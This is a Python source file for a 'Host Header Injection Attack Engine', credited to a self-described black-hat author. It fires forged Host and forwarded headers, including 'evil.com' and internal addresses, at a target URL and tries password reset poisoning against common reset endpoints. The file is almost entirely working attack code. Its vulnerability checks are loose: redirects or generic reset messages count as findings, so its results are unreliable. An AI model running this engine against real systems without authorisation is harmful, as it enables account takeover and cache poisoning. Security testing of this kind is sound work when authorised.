# modules/attacks/host_header.py

"""
Host Header Injection Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Tests for Host header injection vulnerabilities including
password reset poisoning, cache poisoning, and SSRF via
Host header manipulation.
"""

import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse

import requests
from requests.exceptions import RequestException


@dataclass
class HostHeaderResult:
    """Represents a Host header attack result."""
    url: str
    test_type: str
    injected_host: str
    header_used: str
    status_code: int
    response_reflection: bool
    vulnerability_found: bool
    description: str
    evidence: str


class HostHeaderAttacker:
    """
    Host header injection attack engine.
    
    Tests for various Host header manipulation vulnerabilities
    including password reset poisoning, web cache poisoning,
    and server-side request forgery.
    """
    
    TEST_HOSTS = [
        'evil.com',
        '127.0.0.1',
        'localhost',
        'internal.admin.com',
    ]
    
    MANIPULATION_HEADERS = [
        'Host',
        'X-Forwarded-Host',
        'X-Forwarded-For',
        'X-Forwarded-Server',
        'X-Original-Host',
        'X-Original-URL',
        'X-Rewrite-URL',
        'X-HTTP-Host-Override',
        'Forwarded',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the Host header attacker.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.original_host = urlparse(target).netloc
        self.results: List[HostHeaderResult] = []
        self.errors: List[str] = []
    
    def test_host_override(
        self,
        injected_host: str
    ) -> HostHeaderResult:
        """
        Test Host header override vulnerability.
        
        Args:
            injected_host: Host value to inject
            
        Returns:
            HostHeaderResult object
        """
        try:
            headers = {'Host': injected_host}
            response = self.session.get(
                self.target,
                headers=headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )
            
            response_text = response.text
            
            reflection = injected_host in response_text
            
            vulnerability_found = reflection or response.status_code in [301, 302]
            
            result = HostHeaderResult(
                url=self.target,
                test_type='Host Override',
                injected_host=injected_host,
                header_used='Host',
                status_code=response.status_code,
                response_reflection=reflection,
                vulnerability_found=vulnerability_found,
                description=f'Host header injection with value: {injected_host}',
                evidence=f'Status: {response.status_code}, Reflection: {reflection}'
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"Host override test failed: {str(e)}")
            
            return HostHeaderResult(
                url=self.target,
                test_type='Host Override',
                injected_host=injected_host,
                header_used='Host',
                status_code=0,
                response_reflection=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence=''
            )
    
    def test_forwarded_headers(
        self,
        injected_host: str
    ) -> List[HostHeaderResult]:
        """
        Test various forwarded headers for host injection.
        
        Args:
            injected_host: Host value to inject
            
        Returns:
            List of HostHeaderResult objects
        """
        results = []
        
        for header in self.MANIPULATION_HEADERS:
            if header == 'Host':
                continue
            
            try:
                headers = {header: injected_host}
                response = self.session.get(
                    self.target,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
                
                reflection = injected_host in response.text
                
                vulnerability_found = reflection
                
                result = HostHeaderResult(
                    url=self.target,
                    test_type='Forwarded Header Injection',
                    injected_host=injected_host,
                    header_used=header,
                    status_code=response.status_code,
                    response_reflection=reflection,
                    vulnerability_found=vulnerability_found,
                    description=f'Host injection via {header}: {injected_host}',
                    evidence=f'Status: {response.status_code}, Reflection: {reflection}'
                )
                
                results.append(result)
                
            except RequestException:
                continue
        
        self.results.extend(results)
        return results
    
    def test_absolute_url_injection(
        self,
        injected_host: str
    ) -> HostHeaderResult:
        """
        Test absolute URL injection in request line.
        
        Args:
            injected_host: Host value to inject
            
        Returns:
            HostHeaderResult object
        """
        try:
            parsed = urlparse(self.target)
            absolute_url = f"{parsed.scheme}://{injected_host}{parsed.path}"
            
            response = self.session.request(
                'GET',
                absolute_url,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )
            
            vulnerability_found = response.status_code in [200, 301, 302]
            
            result = HostHeaderResult(
                url=self.target,
                test_type='Absolute URL Injection',
                injected_host=injected_host,
                header_used='Request Line',
                status_code=response.status_code,
                response_reflection=False,
                vulnerability_found=vulnerability_found,
                description=f'Absolute URL injection with host: {injected_host}',
                evidence=f'Status: {response.status_code}'
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"Absolute URL injection test failed: {str(e)}")
            
            return HostHeaderResult(
                url=self.target,
                test_type='Absolute URL Injection',
                injected_host=injected_host,
                header_used='Request Line',
                status_code=0,
                response_reflection=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence=''
            )
    
    def test_password_reset_poisoning(
        self,
        reset_endpoint: str,
        email: str,
        injected_host: str
    ) -> HostHeaderResult:
        """
        Test for password reset poisoning via Host header.
        
        Args:
            reset_endpoint: Password reset endpoint
            email: Target email address
            injected_host: Malicious host to inject
            
        Returns:
            HostHeaderResult object
        """
        try:
            full_url = f"{self.target.rstrip('/')}{reset_endpoint}"
            
            headers = {'Host': injected_host}
            data = {'email': email}
            
            response = self.session.post(
                full_url,
                headers=headers,
                data=data,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            response_text = response.text.lower()
            
            poison_indicators = [
                'email sent', 'check your email', 'reset link',
                'password reset', 'if that account exists',
            ]
            
            vulnerability_found = any(
                indicator in response_text
                for indicator in poison_indicators
            )
            
            result = HostHeaderResult(
                url=full_url,
                test_type='Password Reset Poisoning',
                injected_host=injected_host,
                header_used='Host',
                status_code=response.status_code,
                response_reflection=False,
                vulnerability_found=vulnerability_found,
                description=f'Password reset poisoning via Host header: {injected_host}',
                evidence=f'Status: {response.status_code}, Response indicates email sent'
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"Password reset poisoning test failed: {str(e)}")
            
            return HostHeaderResult(
                url=reset_endpoint,
                test_type='Password Reset Poisoning',
                injected_host=injected_host,
                header_used='Host',
                status_code=0,
                response_reflection=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence=''
            )
    
    def run(self) -> Dict[str, Any]:
        """
        Run all Host header attacks.
        
        Returns:
            Dictionary with attack results
        """
        for host in self.TEST_HOSTS:
            self.test_host_override(host)
            self.test_forwarded_headers(host)
            self.test_absolute_url_injection(host)
        
        common_reset_paths = [
            '/reset-password', '/forgot-password',
            '/password/reset', '/auth/reset',
            '/api/password/reset',
        ]
        
        for reset_path in common_reset_paths:
            for host in self.TEST_HOSTS[:2]:
                self.test_password_reset_poisoning(
                    reset_path,
                    'test@example.com',
                    host
                )
        
        findings = []
        for result in self.results:
            if result.vulnerability_found:
                findings.append({
                    'type': f'Host Header Injection: {result.test_type}',
                    'severity': 'medium',
                    'endpoint': result.url,
                    'injected_host': result.injected_host,
                    'header_used': result.header_used,
                    'description': result.description,
                    'evidence': result.evidence,
                    'remediation': 'Validate Host header against whitelist. '
                                   'Use relative paths for redirects. '
                                   'Configure server to ignore forwarded headers.',
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'hosts_tested': len(self.TEST_HOSTS),
            'total_tests': len(self.results),
            'vulnerabilities_found': len(findings),
        }